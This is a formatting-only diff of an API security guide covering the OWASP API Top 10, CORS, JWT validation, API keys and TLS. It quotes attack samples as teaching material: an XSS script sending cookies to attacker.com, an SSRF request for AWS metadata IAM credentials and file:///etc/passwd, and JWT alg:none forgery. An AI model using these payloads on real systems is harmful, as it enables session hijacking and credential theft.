@@ -15,15 +15,18 @@ The 2023 edition reorganized and expanded the 2019 list. Notable changes: BOLA (
 **What it is:** The most common and impactful API vulnerability. An endpoint accepts a user-controlled object identifier and performs an action on that object without verifying that the requesting user has permission to act on that specific object.
 
 **Real-world example pattern:**
+
 ```
 GET /api/invoices/12345
 Authorization: Bearer <user_A_token>
 ```
+
 User A can modify the invoice ID to `12345` → `12346` and access User B's invoice if the server only checks authentication, not object-level authorization.
 
 **Why APIs are particularly vulnerable:** APIs expose object IDs directly in URL paths and request bodies as a matter of design. This creates an implicit authorization requirement for every endpoint.
 
 **Mitigation:**
+
 ```python
 # Wrong: checks only authentication
 def get_invoice(invoice_id: str, current_user: User):
@@ -46,6 +49,7 @@ Use non-sequential, non-guessable IDs (UUIDs) as a defense-in-depth measure — 
 **What it is:** Weak or misconfigured authentication mechanisms that allow attackers to compromise authentication tokens or impersonate users.
 
 **Common failure patterns:**
+
 - Weak JWT secrets (guessable via offline dictionary attacks)
 - JWT `alg: none` accepted (no signature validation)
 - No rate limiting on `/login` endpoints (credential stuffing)
@@ -54,6 +58,7 @@ Use non-sequential, non-guessable IDs (UUIDs) as a defense-in-depth measure — 
 - Predictable reset tokens
 
 **Mitigations:**
+
 - Enforce HTTPS everywhere (HSTS header)
 - Implement rate limiting and account lockout on authentication endpoints
 - Use opaque, short-lived access tokens (15–60 min)
@@ -67,6 +72,7 @@ Use non-sequential, non-guessable IDs (UUIDs) as a defense-in-depth measure — 
 **What it is:** An API returns more properties of an object than the user is authorized to see (excessive data exposure), OR allows users to modify properties they should not be able to change (mass assignment).
 
 **Excessive data exposure example:**
+
 ```json
 // Client requests: GET /users/me
 // Server returns: (entire User model from ORM)
@@ -84,6 +90,7 @@ Use non-sequential, non-guessable IDs (UUIDs) as a defense-in-depth measure — 
 The vulnerability: developers return the full database model without filtering, trusting that "clients will only use the fields they need."
 
 **Mass assignment example:**
+
 ```json
 // Client sends:
 PATCH /users/me
@@ -96,6 +103,7 @@ PATCH /users/me
 ```
 
 **Mitigations:**
+
 - Define explicit response schemas; never return ORM model directly
 - Use DTOs (Data Transfer Objects) with explicit field lists for input and output
 - Allowlist permitted fields on update operations — never use dynamic assignment from request body
@@ -108,12 +116,14 @@ PATCH /users/me
 **What it is:** API does not limit the size or frequency of resource consumption, enabling DoS through excessive requests, large payloads, or expensive operations.
 
 **Attack vectors:**
+
 - Sending very large JSON bodies (memory exhaustion)
 - Triggering expensive database queries via API (complex filter combinations)
 - Flooding webhooks or async job queues
 - Executing deeply nested GraphQL queries (query complexity attacks)
 
 **Mitigations:**
+
 - **Rate limiting:** Requests per minute per user/IP (token bucket or sliding window)
 - **Request size limits:** `Content-Length` enforcement, body size cap (e.g., 1MB max)
 - **Query complexity limits (GraphQL):** Assign weights to fields; reject queries above threshold
@@ -130,6 +140,7 @@ PATCH /users/me
 **Example:** An admin endpoint at `DELETE /admin/users/{id}` or `POST /internal/recalculate-prices` that is unauthenticated or accessible with a regular user token.
 
 **Mitigation:**
+
 - Explicit role checks on every function, not just resource type
 - Deny-by-default: all admin endpoints require explicit admin role grant
 - Separate admin API surface from user-facing API (different base path, network-level controls)
@@ -144,6 +155,7 @@ PATCH /users/me
 **This is not a technical vulnerability** but a design failure to consider business constraints.
 
 **Mitigations:**
+
 - Device fingerprinting and CAPTCHA on business-critical flows
 - Rate limits per user for business actions (not just per endpoint)
 - Anomaly detection on usage patterns
@@ -156,18 +168,22 @@ PATCH /users/me
 **What it is:** An API accepts a URL as input and fetches it server-side. Attackers provide URLs pointing to internal services, metadata endpoints, or file system paths.
 
 **Classic attack:**
+
 ```
 POST /api/webhooks
 { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name" }
 ```
+
 This fetches AWS EC2 instance metadata, potentially exposing IAM credentials.
 
 **Other SSRF targets:**
+
 - Internal services: `http://internal-db:5432/`, `http://redis:6379/`
 - Cloud metadata: `http://169.254.169.254/` (AWS), `http://metadata.google.internal/`
 - File URIs: `file:///etc/passwd`
 
 **Mitigations:**
+
 - Validate URLs before fetching: allowlist allowed domains or IP ranges
 - Block requests to RFC 1918 private IP ranges (10.x, 172.16.x, 192.168.x)
 - Block requests to link-local (169.254.x) and loopback (127.x)
@@ -183,6 +199,7 @@ This fetches AWS EC2 instance metadata, potentially exposing IAM credentials.
 **Common misconfigurations:**
 
 **CORS misconfiguration:**
+
 ```javascript
 // Dangerous: reflects origin blindly
 app.use(cors({
@@ -198,6 +215,7 @@ app.use(cors({
 ```
 
 **Missing security headers:**
+
 ```
 # Required headers
 Strict-Transport-Security: max-age=31536000; includeSubDomains
@@ -208,6 +226,7 @@ Referrer-Policy: strict-origin-when-cross-origin
 ```
 
 **Verbose error messages:**
+
 ```json
 // Wrong — exposes internal paths and library versions
 {
@@ -231,6 +250,7 @@ Referrer-Policy: strict-origin-when-cross-origin
 **Why this is serious:** Security patching and monitoring can only cover known surfaces. A forgotten v1 endpoint without rate limiting or updated authentication is a perfect attack vector.
 
 **Mitigations:**
+
 - API inventory/registry as mandatory infrastructure (not optional documentation)
 - API gateway enforcement: all traffic routes through the gateway; direct backend access is blocked
 - Regular API discovery scans to find undocumented endpoints
@@ -245,6 +265,7 @@ Referrer-Policy: strict-origin-when-cross-origin
 **Example:** Your API fetches product data from a third-party feed and renders it. The third party's response contains: `<script>document.location='https://attacker.com/?c='+document.cookie</script>`. If you pass this directly to a client rendering it as HTML, you've facilitated XSS.
 
 **Mitigations:**
+
 - Validate and sanitize data from third-party APIs against your own schema
 - Apply the same input validation to third-party responses as you do to client requests
 - Don't grant third-party API data elevated trust
@@ -256,6 +277,7 @@ Referrer-Policy: strict-origin-when-cross-origin
 ### TLS 1.3
 
 TLS 1.3 (2018) is the current minimum. Configuration:
+
 - **Disable TLS 1.0 and 1.1** (both deprecated by RFC 8996)
 - **Disable weak cipher suites** (RC4, 3DES, NULL, EXPORT, anon)
 - **TLS 1.3 cipher suites** are fixed and non-negotiable — TLS 1.3 removed cipher suite negotiation for good reason
@@ -273,12 +295,14 @@ add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; prelo
 mTLS extends TLS by requiring the *client* to present a certificate as well as the server. Both parties authenticate each other at the transport layer.
 
 **Use cases:**
+
 - Service-to-service authentication within a microservices mesh
 - B2B APIs where partners have registered certificate fingerprints
 - High-security API endpoints (financial, healthcare)
 - Zero-trust network implementations
 
 **Implementation in API gateways:**
+
 - Kong: `mtls-auth` plugin
 - AWS API Gateway: mutual TLS authentication via truststore S3 bucket
 - Istio/Linkerd: automateD mTLS for all service-to-service traffic in the mesh
@@ -296,6 +320,7 @@ CORS (Cross-Origin Resource Sharing) controls which origins can make browser-bas
 ### How CORS Works
 
 Browser makes a preflight `OPTIONS` request before actual requests with:
+
 - Custom headers
 - Non-simple methods (PUT, DELETE, PATCH)
 - `Content-Type: application/json`
@@ -308,6 +333,7 @@ Access-Control-Request-Headers: Content-Type, Authorization
 ```
 
 Server must respond:
+
 ```
 HTTP/1.1 204 No Content
 Access-Control-Allow-Origin: https://app.example.com
@@ -332,6 +358,7 @@ app.use((req, res, next) => {
 This allows any website to make credentialed requests to your API using a logged-in user's cookies.
 
 **Correct pattern:**
+
 ```javascript
 const ALLOWED_ORIGINS = new Set([
   'https://app.example.com',
@@ -357,12 +384,14 @@ app.use((req, res, next) => {
 API keys are the simplest API authentication mechanism. Used correctly:
 
 **Format:** Prefix + random bytes. Prefix enables identification without exposing the key:
+
 ```
 sk_live_4K8mX9P2nQ7rV3wY1hE6   # Stripe-style
 pk_live_...                      # Stripe publishable key (different prefix = different permissions)
 ```
 
 The prefix `sk_live_` tells you: secret key, live mode. This allows:
+
 - Database queries by prefix (without storing the full key)
 - Identifying leaked keys in code repositories
 - Distinguishing environments (`sk_test_` vs `sk_live_`)
@@ -400,6 +429,7 @@ CREATE TABLE api_keys (
 An attacker modifies the JWT header to `"alg": "none"`, removes the signature, and the server accepts it without validation if the library has this enabled.
 
 Mitigation:
+
 ```javascript
 // Always specify allowed algorithms explicitly
 jwt.verify(token, publicKey, { algorithms: ['RS256'] });
@@ -421,6 +451,7 @@ HS256 with a short or guessable secret is crackable offline. `hashcat` can brute
 Mitigation: Use at least 256 bits of entropy for HS256 secrets (32 random bytes from a CSPRNG). Or switch to RS256/ES256 (asymmetric) which have no secret to crack.
 
 **Correct JWT validation sequence:**
+
 ```python
 def validate_jwt(token: str) -> Claims:
     # 1. Decode header without validation (to get kid/alg)
@@ -458,6 +489,7 @@ Rate limiting is discussed in depth in `12_performance_scaling.md`, but it serve
 - **DoS prevention:** Limit resource-intensive endpoints more aggressively
 
 **Security-specific rate limit examples:**
+
 ```
 POST /auth/login:         5 attempts/minute per IP, 10 per account per hour
 POST /auth/reset-password: 3 attempts/hour per email address
@@ -472,6 +504,7 @@ POST /payments:           50 per user per hour
 **Validation should happen at the trust boundary** — when data enters your system from outside. Do not defer validation to the database.
 
 **Schema validation as the first defense:**
+
 ```python
 from pydantic import BaseModel, EmailStr, constr
 
@@ -501,6 +534,7 @@ schemathesis run openapi.yaml --checks all --target response_time
 ```
 
 **OWASP ZAP API scan:**
+
 ```bash
 docker run -v $(pwd):/zap/wrk -t ghcr.io/zaproxy/zaproxy:stable \
   zap-api-scan.py -t http://api.example.com/openapi.json \
